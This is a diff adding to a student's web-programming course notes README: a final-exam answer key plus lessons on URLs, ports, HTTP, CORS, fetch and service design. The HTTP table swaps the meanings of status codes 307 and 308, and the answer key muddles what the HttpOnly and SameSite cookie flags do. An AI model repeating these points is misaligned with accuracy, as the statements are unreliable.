@@ -6,6 +6,8 @@
 
 [go to instructions on testing back end server](#back-end-testing)
 
+[go to general answers to final exam study guide](#final-study-guide-answers)
+
 [go to general class notes](#class-notes)
 
 [go to my IP address and how to SSH into a server](#my-ip-and-how-to-ssh)
@@ -167,8 +169,124 @@
 
 [go to Midterm study guide](#midterm-review)
 
-### Web Services
 
+### Web Services: 
+
+[go to Web Services Introduction](#web-services-intro)  
+
+[go to URL](#url)
+
+[go to Ports](#ports)
+
+[go to HTTP](#http)
+
+[go to SOP and CORS](#sop-and-cors)
+
+[go to Fetch](#fetch)
+
+[go to Service Design](#service-design)
+
+[go to Node.js](#node-js)
+
+[go to Express](#express)
+
+[go to Debugging Node.js](#debug-node-js)
+
+[go to Service Daemons - PM2](#pm2)
+
+[go to UI Testing](#ui-testing)
+
+[go to Endpoint testing](#endpoint-testing)
+
+[go to Simon Service](#simon-service)
+
+[go to Startup Service](#startup-service)
+
+[go to Storage Services](#storage-service)
+
+[go to Data Services](#data-service)
+
+[go to Simon DB](#simon-db)
+
+[go to Startup DB](#startup-db)
+
+[go to authorization services](#authorization-service)
+
+[go to Account creation and login](#login)
+
+[go to Simon login](#simon-login)
+
+[go to Startup login](#startup-login)
+
+[go to WebSocket](#websocket)
+
+[go to debugging WebSocket](#websocket-debug)
+
+[go to WebSocket Chat](#websocket-chat)
+
+[go to Simon WebSocket](#simon-websocket)
+
+[go to Startup WebSocket](#startup-websocket)
+
+
+### Web Frameworks:
+
+
+[go to Web Frameworks intro](#web-frameworks-intro)
+
+[go to React intro](#react-intro)
+
+[go to React components](#react-components)
+
+[go to React toolchains](#react-toolchains)
+
+[go to Vite](#vite)
+
+[go to React router](#react-router)
+
+[go to React reactivity](#react-reactivity)
+
+[go to React Tic-Tac-Toe Tutorial](#react-tic-tac-toe)
+
+[go to React hooks](#react-hooks)
+
+[go to Simon React](#react-simon)
+
+[go to Startup React](#react-startup)
+    
+
+### Assorted Topics
+
+
+[go to Security overview](#security)
+
+[go to OWASP top 10](#security-owasp)
+
+[go to Security practice](#security-practice)
+
+[go to TypeScript](#typescript)
+
+[go to Performance Monitoring](#performance-monitoring)
+
+[go to Search engine optimization](#seo)
+
+[go to Device APIs](#device-api)
+
+[go to Progressive web application](#pwa)
+
+[go to Simon PWA](#pwa-simon)
+
+[go to Demo Day](#demo-day)
+
+[go to Wrap Up](#wrap-up)
+
+
+### Final Exam Study Guide:
+
+[go to Final Exam study guide](#final-review)
+
+
+# Notes:
 
 
 ### command line commands
@@ -215,6 +333,110 @@
   	 - $ curl -X POST localhost:4000/api/highscore -H "Content-Type: application/json" -d '{"newHighscore" : 54}'
   - to test any other method other than post or get use the format shown in post but replacing post with the method
   - replace the url path in the examples with the path you are using
+ 
+
+## Final Exam study guide answers (general):
+
+<a id="final-study-guide-answers"></a>Final exam study guide answer key (general):
+[go to top](#top)
+
+port 80: default port for HTTP
+
+port 443: default port for HTTPS (secure version of HTTP)
+
+port 22: used for SSH communication and allows remote administration access to the VM
+
+HTTP Status codes:
+
+- 300 range is redirection
+- 400 range is client error
+- 500 range is server error
+
+HTTP header content-type allows you to specify content type being sent over HTTP
+
+Domain: where cookies come from
+
+Path: path where the cookie was generated (ex: in the URL Startup.cs260.click/foo, /foo is the path)
+
+SameSite: only returns cookie to the domain it came from
+
+HTTPOnly: stops JS from running on browser so that it can read the cookie
+
+fetch requests (on the front end), return information from a call to the server from a client
+
+Express service codes:
+
+-app = express();
+-app.use
+-app.set
+-etc.
+
+all of these are examples of Express service code (express middleware)
+
+MongoDB query
+
+$gt: = greater than
+
+/fran.*/ is a regEx structure
+
+"." means any character
+
+"*" means any number of that character
+
+the query returns an array of all matching documents (in the case on the final study guide, its anything greater than 10 that follows the specified regEx format)
+
+you should store user passwords in database by hashing and salting them
+
+some WS messages include "connected" and "disconnected"
+
+WebSocket protocol: key aspect is instantaneous client to server connection where either client or server can initiate the contact
+
+JSX: JavaScript + HTML smushed together
+
+anything after return is rendered to the screen
+
+if rendering a function in return, make sure to use the curly braces
+
+12) will return:
+    Hello Sara
+    Hello Cahal
+    Hello Edite
+
+13) will print the entire list (in bullet point format, as it is an unordered list (ul))
+
+14) will increase the count by 1 every time the button is clicked (brings in counter and the button)
+
+React hooks modify the state of a component (handle the state and handle the lifecycle components of the state (onCreate, onLoad, etc.))
+
+useEffect hook: watches lifecycle events of a component and runs those lifecycle events. Whenever a variable is changed, destroyed, or created, use this. Updates code when things change.
+
+17) creates a router for all the jsx components on the page
+
+renders different components on top of one another depending on which one is searched for
+
+("/" displays main page and index.html as well as any jsx components associated with it)
+
+"("*" element={<NoPage />} /> renders NoPage error)"
+
+npm manages your node packages and download external packages
+
+package.json lists all packages you have, specifies certain scripts such as deployment scripts, what commands to use to run your server, and your name, project name, and other meta data used for running your project
+
+node.js runs your server
+
+Vite allows you to bundle all your code together for production so that it can be deployed to a server (can also install modules, run certain React components, transposes React components into JavaScript components to be run on a server, and other things)
+
+be sure to know what happens to WS on connection (when Front End connects to Back End via PeerProxy)
+
+on connection, on message, on close
+
+the three big things to remember with WebSocket 
+
+pay attention to method and path and if the path contains something defined earlier on in the file (for apiRouters)
+
+will contain everything until res.send
+
+
 
 ## class notes
 
@@ -222,6 +444,8 @@
 [go to top](#top)
 
 From the GitHub assignment, I learned how to use git, including push, pull, settle merge conflicts. etc.
+
+### NOTE: After everything is graded, follow instructions under Wrap Up to clean up your resources on AWS, otherwise you might get charged money over it. DO NOT FORGET TO DO THIS!! VERY IMPORTANT!!! 
 
 for simon.css, I deployed it to my domain, mostly the same as the original simon.css file, except that I made the color for the .event in the play.css file a little darker to make it more visible.
 
@@ -252,6 +476,7 @@ port 80: default port for HTTP
 port 443: default port for HTTPS (secure version of HTTP)
 
 port 22: used for SSH communication and allows remote administration access to the VM
+
 
 to display an image with a hyperlink in HTML, add the < 'img' > tag inside an < 'a' > tag.
 
@@ -7126,3 +7351,6278 @@ The midterm will cover all topics from the start of class until the end of the J
 
 # Web Servers:
 
+
+
+# Web services introduction
+
+<a id="web-services-intro"></a>Web services introduction:
+[go to top](#top)
+
+Up to this point, your entire application is loaded from your web server and runs on the user's browser. It starts when the browser requests the `index.html` file from the web server. The `index.html`, in turn, references other HTML, CSS, JavaScript, or image files. All of these files, that are running on the browser, comprise the `frontend` of your application.
+
+Notice that when the frontend requests the application files from the web server it is using the HTTPS protocol. All web programming requests between devices use HTTPS to exchange data.
+
+![Frontend](frontEnd.png)
+
+From our frontend JavaScript we can make requests to external services running anywhere in the world. This allows us to get external data, such as an inspirational quote, that we then inject into the DOM for the user to read. To make a web service request, we supply the URL of the web service to the `fetch` function that is built into the browser.
+
+![Frontend Fetch](frontEndFetch.png)
+
+The next step in building a full stack web application, is to create our own web service. Our web service will provide the static frontend files along with functions to handle `fetch` requests for things like storing data persistently, providing security, running tasks, executing application logic that you don't want your user to be able to see, and communicating with other users. The functionality provided by your web service represents the `backend` of your application.
+
+Generally the functions provided by a web service are called `endpoints`, or sometimes APIs. You access the web service endpoints from your frontend JavaScript with the fetch function. In the picture below, the backend web service is not only providing the static files that make up the frontend, but also providing the web service endpoints that the frontend calls to do things like get a user, create a user, or get high scores.
+
+![Backend](backEnd.png)
+
+The backend web service can also use `fetch` to make requests to other web services. For example, in the image below the frontend uses `fetch` to request the user's data from the backend web service. The backend then uses `fetch` to call two other web services, one to get the user's data from the database, and another one to request subway routes that are near the user's home. That data is then combined together by the backend web service and returned to the frontend for display in the browser.
+
+![Backend](backEndFetch.png)
+
+In following instruction we will discuss how to use fetch, HTTP, and URLs, and build a web service using the Node.js application. With all of this in place your application will be a full stack application comprised of both a frontend and a backend.
+
+
+
+# URL
+
+<a id="url"></a>URL:
+[go to top](#top)
+
+📖 **Deeper dive reading**: [MDN What is a URL](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_is_a_URL)
+
+The Uniform Resource Locator (URL) represents the location of a web resource. A web resource can be anything, such as a web page, font, image, video stream, database record, or JSON object. It can also be completely ephemeral, such as a visitation counter, or gaming session.
+
+Looking at the different parts of a URL is a good way to understand what it represents. Here is an example URL that represents the summary of accepted CS 260 BYU students that is accessible using secure HTTP.
+
+```js
+https://byu.edu:443/cs/260/student?filter=accepted#summary
+```
+
+The URL syntax uses the following convention. Notice the delimiting punctuation between the parts of the URL. Most parts of the URL are optional. The only ones that are required are the scheme, and the domain name.
+
+```yaml
+<scheme>://<domain name>:<port>/<path>?<parameters>#<anchor>
+```
+
+| Part        | Example                              | Meaning                                                                                                                                                                                                                                                                             |
+| ----------- | ------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Scheme      | https                                | The protocol required to ask for the resource. For web applications, this is usually HTTPS. But it could be any internet protocol such as FTP or MAILTO.                                                                                                                            |
+| Domain name | byu.edu                              | The domain name that owns the resource represented by the URL.                                                                                                                                                                                                                      |
+| Port        | 3000                                 | The port specifies the numbered network port used to connect to the domain server. Lower number ports are reserved for common internet protocols, higher number ports can be used for any purpose. The default port is 80 if the scheme is HTTP, or 443 if the scheme is HTTPS.     |
+| Path        | /school/byu/user/8014                | The path to the resource on the domain. The resource does not have to physically be located on the file system with this path. It can be a logical path representing endpoint parameters, a database table, or an object schema.                                                    |
+| Parameters  | filter=names&highlight=intro,summary | The parameters represent a list of key value pairs. Usually it provides additional qualifiers on the resource represented by the path. This might be a filter on the returned resource or how to highlight the resource. The parameters are also sometimes called the query string. |
+| Anchor      | summary                              | The anchor usually represents a sub-location in the resource. For HTML pages this represents a request for the browser to automatically scroll to the element with an ID that matches the anchor. The anchor is also sometimes called the hash, or fragment ID.                     |
+
+Technically you can also provide a user name and password before the domain name. This was used historically to authenticate access, but for security reasons this is deprecated. However, you will still see this convention for URLs that represent database connection strings.
+
+## URL, URN, and URI
+
+You will sometimes hear the use of URN or URI when talking about web resources. A Uniform Resource Name (URN) is a unique resource name that does not specify location information. For example, a book URN might be `urn:isbn:10,0765350386`. A Uniform Resource Identifier (URI) is a general resource identifier that could refer to either a URL or a URN. With web programming you are almost always talking about URLs and therefore you should not use the more general URI.
+
+
+
+# Ports
+
+<a id="ports"></a>Ports:
+[go to top](#top)
+
+When you connect to a device on the internet you need both an IP address and a numbered port. Port numbers allow a single device to support multiple protocols (e.g. HTTP, HTTPS, FTP, or SSH) as well as different types of services (e.g. search, document, or authentication). The ports may be exposed externally, or they may only be used internally on the device. For example, the HTTPS port (443) might allow the world to connect, the SSH port (22) might only allow computers at your school, and a service defined port (say 3000) may only allow access to processes running on the device.
+
+The internet governing body, IANA, defines the standard usage for port numbers. Ports from 0 to 1023 represent standard protocols. Generally a web service should avoid these ports unless it is providing the protocol represented by the standard. Ports from 1024 to 49151 represent ports that have been assigned to requesting entities. However, it is very common for these ports to be used by services running internally on a device. Ports from 49152 to 65535 are considered dynamic and are used to create dynamic connections to a device. [Here](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) is the link to IANA's registry.
+
+Here is a list of common port numbers that you might come across.
+
+| Port | Protocol                                                                                           |
+| ---- | -------------------------------------------------------------------------------------------------- |
+| 20   | File Transfer Protocol (FTP) for data transfer                                                     |
+| 22   | Secure Shell (SSH) for connecting to remote devices                                                |
+| 25   | Simple Mail Transfer Protocol (SMTP) for sending email                                             |
+| 53   | Domain Name System (DNS) for looking up IP addresses                                               |
+| 80   | Hypertext Transfer Protocol (HTTP) for web requests                                                |
+| 110  | Post Office Protocol (POP3) for retrieving email                                                   |
+| 123  | Network Time Protocol (NTP) for managing time                                                      |
+| 161  | Simple Network Management Protocol (SNMP) for managing network devices such as routers or printers |
+| 194  | Internet Relay Chat (IRC) for chatting                                                             |
+| 443  | HTTP Secure (HTTPS) for secure web requests                                                        |
+
+## Your ports
+
+As an example of how ports are used we can look at your web server. When you built your web server you externally exposed port 22 so that you could use SSH to open a remote console on the server, port 443 for secure HTTP communication, and port 80 for unsecure HTTP communication.
+
+![Ports](webServicesPorts.jpg)
+
+Your web service, Caddy, is listening on ports 80 and 443. When Caddy gets a request on port 80, it automatically redirects the request to port 443 so that a secure connection is used. When Caddy gets a request on port 443 it examines the path provided in the HTTP request (as defined by the URL) and if the path matches a static file, it reads the file off disk and returns it. If the HTTP path matches one of the definitions it has for a gateway service, Caddy makes a connection on that service's port (e.g. 3000 or 4000) and passes the request to the service.
+
+Internally on your web server, you can have as many web services running as you would like. However, you must make sure that each one uses a different port to communicate on. You run your Simon service on port 3000 and therefore **cannot** use port 3000 for your startup service. Instead you use port 4000 for your startup service. It does not matter what high range port you use. It only matters that you are consistent and that they are only used by one service.
+
+
+
+# HTTP
+
+<a id="http"></a>HTTP:
+[go to top](#top)
+
+📖 **Deeper dive reading**: [MDN An overview of HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview)
+
+Hypertext Transfer Protocol (`HTTP`) is how the web talks. When a web browser makes a request to a web server it does it using the HTTP protocol. In previous instruction we discussed how to use HTTP. Now, we will talk about the internals of HTTP. Just like becoming fluent in a foreign language makes a visit to another country more enjoyable, understanding how to speak HTTP helps you communicate effectively when talking on the web.
+
+When a web client (e.g. a web browser) and a web server talk they exchange HTTP requests and responses. The browser will make an HTTP request and the server will generate an HTTP response. You can see the HTTP exchange by using the browser's debugger or by using a console tool like `curl`. For example, in your console you can use `curl` to make the following request.
+
+```sh
+curl -v -s http://info.cern.ch/hypertext/WWW/Helping.html
+```
+
+### Request
+
+The HTTP request for the above command would look like the following.
+
+```http
+GET /hypertext/WWW/Helping.html HTTP/1.1
+Host: info.cern.ch
+Accept: text/html
+```
+
+An HTTP request has this general syntax.
+
+```yaml
+<verb> <url path, parameters, anchor> <version>
+[<header key: value>]*
+[
+
+  <body>
+]
+```
+
+The first line of the HTTP request contains the `verb` of the request, followed by the path, parameters, and anchor of the URL, and finally the version of HTTP being used. The following lines are optional headers that are defined by key value pairs. After the headers you have an optional body. The body start is delimited from the headers with two new lines.
+
+In the above example, we are asking to `GET` a resource found at the path `/hypertext/WWW/Helping.html`. The version used by the request is `HTTP/1.1`. This is followed by two headers. The first specifies the requested host (i.e. domain name). The second specifies what type of resources the client will accept. The resource type is always a [MIME type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) as defined by internet governing body IANA. In this case we are asking for HTML.
+
+### Response
+
+The response to the above request looks like this.
+
+```yaml
+HTTP/1.1 200 OK
+Date: Tue, 06 Dec 2022 21:54:42 GMT
+Server: Apache
+Last-Modified: Thu, 29 Oct 1992 11:15:20 GMT
+ETag: "5f0-28f29422b8200"
+Accept-Ranges: bytes
+Content-Length: 1520
+Connection: close
+Content-Type: text/html
+
+<TITLE>Helping -- /WWW</TITLE>
+<NEXTID 7>
+<H1>How can I help?</H1>There are lots of ways you can help if you are interested in seeing
+the <A NAME=4 HREF=TheProject.html>web</A> grow and be even more useful...
+```
+
+An HTTP response has the following syntax.
+
+```yaml
+<version> <status code> <status string>
+[<header key: value>]*
+[
+
+  <body>
+]
+```
+
+You can see that the response syntax is similar to the request syntax. The major difference is that the first line represents the version and the status of the response.
+
+Understanding the meaning of the common HTTP verbs, status codes, and headers is important for you to understand, as you will use them in developing a web application. Take some time to internalize the following common values.
+
+## Verbs
+
+There are several verbs that describe what the HTTP request is asking for. The list below only describes the most common ones.
+
+| Verb    | Meaning                                                                                                                                                                                                                                                  |
+| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| GET     | Get the requested resource. This can represent a request to get a single resource or a resource representing a list of resources.                                                                                                                        |
+| POST    | Create a new resource. The body of the request contains the resource. The response should include a unique ID of the newly created resource.                                                                                                             |
+| PUT     | Update a resource. Either the URL path, HTTP header, or body must contain the unique ID of the resource being updated. The body of the request should contain the updated resource. The body of the response may contain the resulting updated resource. |
+| DELETE  | Delete a resource. Either the URL path or HTTP header must contain the unique ID of the resource to delete.                                                                                                                                              |
+| OPTIONS | Get metadata about a resource. Usually only HTTP headers are returned. The resource itself is not returned.                                                                                                                                              |
+
+## Status codes
+
+It is important that you use the standard HTTP status codes in your HTTP responses so that the client of a request can know how to interpret the response. The codes are partitioned into five blocks.
+
+- 1xx - Informational.
+- 2xx - Success.
+- 3xx - Redirect to some other location, or that the previously cached resource is still valid.
+- 4xx - Client errors. The request is invalid.
+- 5xx - Server errors. The request cannot be satisfied due to an error on the server.
+
+Within those ranges here are some of the more common codes. See the [MDN documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) for a full description of status codes.
+
+| Code | Text                                                                                 | Meaning                                                                                                                           |
+| ---- | ------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------- |
+| 100  | Continue                                                                             | The service is working on the request                                                                                             |
+| 200  | Success                                                                              | The requested resource was found and returned as appropriate.                                                                     |
+| 201  | Created                                                                              | The request was successful and a new resource was created.                                                                        |
+| 204  | No Content                                                                           | The request was successful but no resource is returned.                                                                           |
+| 304  | Not Modified                                                                         | The cached version of the resource is still valid.                                                                                |
+| 307  | Permanent redirect                                                                   | The resource is no longer at the requested location. The new location is specified in the response location header.               |
+| 308  | Temporary redirect                                                                   | The resource is temporarily located at a different location. The temporary location is specified in the response location header. |
+| 400  | Bad request                                                                          | The request was malformed or invalid.                                                                                             |
+| 401  | Unauthorized                                                                         | The request did not provide a valid authentication token.                                                                         |
+| 403  | Forbidden                                                                            | The provided authentication token is not authorized for the resource.                                                             |
+| 404  | Not found                                                                            | An unknown resource was requested.                                                                                                |
+| 408  | Request timeout                                                                      | The request takes too long.                                                                                                       |
+| 409  | Conflict                                                                             | The provided resource represents an out of date version of the resource.                                                          |
+| 418  | [I'm a teapot](https://en.wikipedia.org/wiki/Hyper_Text_Coffee_Pot_Control_Protocol) | The service refuses to brew coffee in a teapot.                                                                                   |
+| 429  | Too many requests                                                                    | The client is making too many requests in too short of a time period.                                                             |
+| 500  | Internal server error                                                                | The server failed to properly process the request.                                                                                |
+| 503  | Service unavailable                                                                  | The server is temporarily down. The client should try again with an exponential back off.                                         |
+
+## Headers
+
+📖 **Deeper dive reading**: [MDN HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
+
+HTTP headers specify metadata about a request or response. This includes things like how to handle security, caching, data formats, and cookies. Some common headers that you will use include the following.
+
+| Header                      | Example                              | Meaning                                                                                                                                                                        |
+| --------------------------- | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Authorization               | Bearer bGciOiJIUzI1NiIsI             | A token that authorized the user making the request.                                                                                                                           |
+| Accept                      | image/\*                             | The format the client accepts. This may include wildcards.                                                                                                            |
+| Content-Type                | text/html; charset=utf-8             | The format of the content being sent. These are described using standard [MIME](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types) types. |
+| Cookie                      | SessionID=39s8cgj34; csrftoken=9dck2 | Key value pairs that are generated by the server and stored on the client.                                                                                                     |
+| Host                        | info.cern.ch                         | The domain name of the server. This is required in all requests.                                                                                                               |
+| Origin                      | cs260.click                          | Identifies the origin that caused the request. A host may only allow requests from specific origins.                                                                           |
+| Access-Control-Allow-Origin | https://cs260.click                  | Server response of what origins can make a request. This may include a wildcard.                                                                                               |
+| Content-Length              | 368                                  | The number of bytes contained in the response.                                                                                                                                 |
+| Cache-Control               | public, max-age=604800               | Tells the client how it can cache the response.                                                                                                                                |
+| User-Agent                  | Mozilla/5.0 (Macintosh)              | The client application making the request.                                                                                                                                     |
+
+## Body
+
+The format of the body of an HTTP request or response is defined by the `Content-Type` header. For example, it may be HTML text (text/html), a binary image format (image/png), JSON (application/json), or JavaScript (text/javascript). A client may specify what formats it accepts using the `accept` header.
+
+## Cookies
+
+![Cookie](webServicesCookie.png)
+
+📖 **Deeper dive reading**: [MDN Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
+
+HTTP itself is stateless. This means that one HTTP request does not know anything about a previous or future request. However, that does not mean that a server or client cannot track state across requests. One common method for tracking state is the `cookie`. Cookies are generated by a server and passed to the client as an HTTP header.
+
+```http
+HTTP/2 200
+Set-Cookie: myAppCookie=tasty; SameSite=Strict; Secure; HttpOnly
+```
+
+The client then caches the cookie and returns it as an HTTP header back to the server on subsequent requests.
+
+```http
+HTTP/2 200
+Cookie: myAppCookie=tasty
+```
+
+This allows the server to remember things like the language preference of the user, or the user's authentication credentials. A server can also use cookies to track, and share, everything that a user does. However, there is nothing inherently evil about cookies; the problem comes from web applications that use them as a means to violate a user's privacy or inappropriately monetize their data.
+
+## HTTP Versions
+
+HTTP continually evolves in order to increase performance and support new types of applications. You can read about the evolution of HTTP on [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Evolution_of_HTTP).
+
+| Year | Version | Features                                        |
+| ---- | ------- | ----------------------------------------------- |
+| 1990 | HTTP0.9 | one line, no versions, only get                 |
+| 1996 | HTTP1   | get/post, header, status codes, content-type    |
+| 1997 | HTTP1.1 | put/patch/delete/options, persistent connection |
+| 2015 | HTTP2   | multiplex, server push, binary representation   |
+| 2022 | HTTP3   | QUIC for transport protocol, always encrypted   |
+
+
+
+# SOP and CORS
+
+<a id="sop-and-cors"></a>SOP and CORS:
+[go to top](#top)
+
+📖 **Deeper dive reading**:
+
+- [MDN Same origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
+- [MDN Cross origin resource sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
+
+Security should always be on your mind when you are working with the web. The ability to provide services to a global audience makes the information on the web very valuable, and therefore an attractive target for nefarious parties. When website architecture and browser clients were still in their infancy they allowed JavaScript to make requests from one domain while displaying a website from a different domain. These are called cross-origin requests.
+
+Consider the following example. An attacker sends out an email with a link to a hacker website (`byu.iinstructure.com`) that is similar to the real course website. Notice the additional `i`. If the hacker website could request anything from the real website then it could make itself appear and act just like the real education website. All it would have to do is request images, html, and login endpoints from the course's website and display the results on the hacker website. This would give the hacker access to everything the user did.
+
+To combat this problem the `Same Origin Policy` (SOP) was created. Simply stated SOP only allows JavaScript to make requests to a domain if it is the same domain that the user is currently viewing. A request from `byu.iinstructure.com` for service endpoints that are made to `byu.instructure.com` would fail because the domains do not match. This provides significant security, but it also introduces complications when building web applications. For example, if you want build a service that any web application can use it would also violate the SOP and fail. In order to address this, the concept of Cross Origin Resource Sharing (CORS) was invented.
+
+CORS allows the client (e.g. browser) to specify the origin of a request and then let the server respond with what origins are allowed. The server may say that all origins are allowed, for example if they are a general purpose image provider, or only a specific origin is allowed, for example if they are a bank's authentication service. If the server doesn't specify what origin is allowed then the browser assumes that it must be the same origin.
+
+Going back to our hacker example, the HTTP request from the hacker site (`byu.iinstructure.com`) to the course's authentication service (`byu.instructure.com`) would look like the following.
+
+```http
+GET /api/auth/login HTTP/2
+Host: byu.instructure.com
+Origin: https://byu.iinstructure.com
+```
+
+In response the course website would return:
+
+```http
+HTTP/2 200 OK
+Access-Control-Allow-Origin: https://byu.instructure.com
+```
+
+The browser would then see that the actual origin of the request does not match the allowed origin and so the browser blocks the response and generates an error.
+
+Notice that with CORS, it is the browser that is protecting the user from accessing the course website's authentication endpoint from the wrong origin. CORS is only meant to alert the user that something nefarious is being attempted. A hacker can still proxy requests through their own server to the course website and completely ignore the `Access-Control-Allow-Origin` header. Therefore the course website needs to implement its own precautions to stop a hacker from using its services inappropriately.
+
+## Using third party services
+
+When you make requests to your own web services you are always on the same origin and so you will not violate the SOP. However, if you want to make requests to a different domain than the one your web application is hosted on, then you need to make sure that domain allows requests as defined by the `Access-Control-Allow-Origin` header it returns. For example, if I have JavaScript in my web application loaded from `cs260.click` that makes a fetch request for an image from the website `i.picsum.photos` the browser will fail the request with an HTTP status code of 403 and an error message that CORS has blocked the request.
+
+![CORS](webServicesCors.jpg)
+
+That happens because `i.picsum.photos` does not return an `Access-Control-Allow-Origin` header. Without a header the browser assumes that all requests must be made from the same origin.
+
+If your web application instead makes a service request to `icanhazdadjoke.com` to get a joke, that request will succeed because `icanhazdadjoke.com` returns an `Access-Control-Allow-Origin` header with a value of `*` meaning that any origin can make requests to this service.
+
+```http
+HTTP/2 200
+access-control-allow-origin: *
+
+Did you hear about the bread factory burning down? They say the business is toast.
+```
+
+This would have also succeeded if the HTTP header had explicitly listed your web application domain. For example, if you make your request from the origin `cs260.click` the following response would also satisfy CORS.
+
+```http
+HTTP/2 200
+access-control-allow-origin: https://cs260.click
+
+I’ll tell you something about German sausages, they’re the wurst
+```
+
+This all means that you need to test the services you want to use before you include them in your application. Make sure they are responding with `*` or your calling origin. If they do not then you will not be able to use them.
+
+
+# Fetch
+
+<a id="fetch"></a>Fetch:
+[go to top](#top)
+
+🔑 **Recommended reading**: [MDN Using the Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch)
+
+The ability to make HTTP requests from JavaScript is one of the main technologies that changed the web from static content pages (Web 1.0) to one of web applications (Web 2.0) that fully interact with the user. Microsoft introduced the first API for making HTTP requests from JavaScript with the [XMLHttpRequest API](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest).
+
+Today, the [fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) is the preferred way to make HTTP requests. The `fetch` function is built into the browser's JavaScript runtime. This means you can call it from JavaScript code running in a browser.
+
+The basic usage of fetch takes a URL and returns a promise. The promise `then` function takes a callback function that is asynchronously called when the requested URL content is obtained. If the returned content is of type `application/json` you can use the `json` function on the response object to convert it to a JavaScript object.
+
+The following example makes a fetch request to get and display an inspirational quote.
+
+```js
+fetch('https://api.quotable.io/random')
+  .then((response) => response.json())
+  .then((jsonResponse) => {
+    console.log(jsonResponse);
+  });
+```
+
+**Response**
+
+```js
+{
+  content: 'Never put off till tomorrow what you can do today.',
+  author: 'Thomas Jefferson',
+};
+```
+
+To do a POST request you populate the options parameter with the HTTP method and headers.
+
+```js
+fetch('https://jsonplaceholder.typicode.com/posts', {
+  method: 'POST',
+  body: JSON.stringify({
+    title: 'test title',
+    body: 'test body',
+    userId: 1,
+  }),
+  headers: {
+    'Content-type': 'application/json; charset=UTF-8',
+  },
+})
+  .then((response) => response.json())
+  .then((jsonResponse) => {
+    console.log(jsonResponse);
+  });
+```
+
+
+
+# Service design
+
+<a id="service-design"></a>Service Design:
+[go to top](#top)
+
+Web services provide the interactive functionality of your web application. They commonly authenticate users, track their session state, provide, store, and analyze data, connect peers, and aggregate user information. Making your web service easy to use, performant, and extensible are factors that determine the success of your application. A good design will result in increased productivity, satisfied users, and lower processing costs.
+
+## Model and sequence diagrams
+
+When first considering your service design it is helpful to model the application's primary objects and the interactions of the objects. You should attempt to stay as close to the model that is in your user's mind as possible. Avoid introducing a model that focuses on programming constructs and infrastructure. For example, a chat program should model participants, conversations, and messages. It should not model user devices, network connections, and data blobs.
+
+Once you have defined your primary objects you can create sequence diagrams that show how the objects interact with each other. This will help clarify your model and define the necessary endpoints. You can use a simple tool like [SequenceDiagram.org](https://sequencediagram.org/index.html#initialData=C4S2BsFMAIGEAsCGxqIA5oFCcQY2APYBO0AguCLpDvsdAEIEBG25lkAtAHwDKkRAN34AuPikQDEIcIiZRMjJtz6CRY1JOmz5igDy6OHFUKLC2VDVJlzq5yPsPGRDZpa03Md5fxOjgiIhRcAgA7EwBnZBBQ6AB3MHgXFj0DIx8RWFCIqJiiSABHAFdIcJQQglAAM0ockIVmb1VTUlwqNBQ7aGCw-kjQUPqlXnTTHkQAT2gAIgAJSHBwAinoQjIKKkwnIm47YVn5xeXKogIAWySgA) to create and share diagrams.
+
+![Sequence Diagram](webServicesSequenceDiagram.jpg)
+
+## Leveraging HTTP
+
+Web services are usually provided over HTTP, and so HTTP greatly influences the design of the service. The HTTP verbs such as GET, POST, PUT, and DELETE often mirror the designed actions of a web service. For example, a web service for managing comments might list the comments (GET), create a comment (POST), update a comment (PUT), and delete a comment (DELETE). Likewise, the MIME content types defined by IANA are a natural fit for defining the types of content that you want to provide (e.g. HTML, PNG, MP3, and MP4). The goal is to leverage those technologies as much as possible so that you don't have to recreate the functionality they provide and instead take advantage of the significant networking infrastructure built up around HTTP. This includes caching servers that increase your performance, edge servers that bring your content closer, and replication servers that provide redundant copies of your content and make your application more resilient to network failures.
+
+![HTTP](webServicesHTTPServices.jpg)
+
+## Endpoints
+
+A web service is usually divided up into multiple service endpoints. Each endpoint provides a single functional purpose. All of the criteria that you would apply to creating well designed code functions also applies when exposing service endpoints.
+
+![HTTP](webServicesHTTPEndpoints.jpg)
+
+⚠ Note that service endpoints are often called an Application Programming Interface (API). This is a throwback to old desktop applications and the programming interfaces that they exposed. Sometimes the term API refers to the entire collection of endpoints, and sometimes it is used to refer to a single endpoint.
+
+Here are some things you should consider when designing your service's endpoints.
+
+- **Grammatical** - With HTTP everything is a resource (think noun or object). You act on the resource with an HTTP verb. For example, you might have an order resource that is contained in a store resource. You then create, get, update, and delete order resources on the store resource.
+- **Readable** - The resource you are referencing with an HTTP request should be clearly readable in the URL path. For example, an order resource might contain the path to both the order and store where the order resource resides: `/store/provo/order/28502`. This makes it easier to remember how to use the endpoint because it is human readable.
+- **Discoverable** - As you expose resources that contain other resources you can provide the endpoints for the aggregated resources. This makes it so someone using your endpoints only needs to remember the top level endpoint and then they can discover everything else. For example, if you have a store endpoint that returns information about a store you can include an endpoint for working with a store in the response.
+
+  ```http
+  GET /store/provo  HTTP/2
+  ```
+
+  ```json
+  {
+    "id": "provo",
+    "address": "Cougar blvd",
+    "orders": "https://cs260.click/store/provo/orders",
+    "employees": "https://cs260.click/store/provo/employees"
+  }
+  ```
+
